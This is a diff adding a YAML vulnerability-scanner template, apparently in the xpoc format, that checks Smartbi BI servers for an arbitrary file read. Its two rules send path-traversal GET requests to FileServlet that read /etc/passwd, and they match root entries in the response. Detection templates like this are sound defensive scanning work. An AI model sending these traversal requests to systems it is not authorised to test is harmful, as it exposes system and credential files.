@@ -1,0 +1,27 @@
+expression: r0() || r1()
+id: smartbi-smartbi-bi-readfile
+info:
+    author: xpoc
+    created: 2023/07/13
+    name: Smartbi smartbi_bi 任意文件读取
+    severity: high
+    tags:
+        - smartbi
+        - readfile
+        - Eserv
+        - Servlet
+        - eserv
+    verified: false
+rules:
+    r0:
+        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+        request:
+            follow_redirects: true
+            method: GET
+            path: /vision/FileServlet?ftpType=out&path=upload/../../../../../../../../../../etc/passwd&name=f24e09e9-f970-7c61-dcf4-491b2ed7838c.docx
+    r1:
+        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+        request:
+            follow_redirects: true
+            method: GET
+            path: /smartbi/vision/FileServlet?ftpType=out&path=upload/../../../../../../../../../../etc/passwd&name=f24e09e9-f970-7c61-dcf4-491b2ed7838c.docx
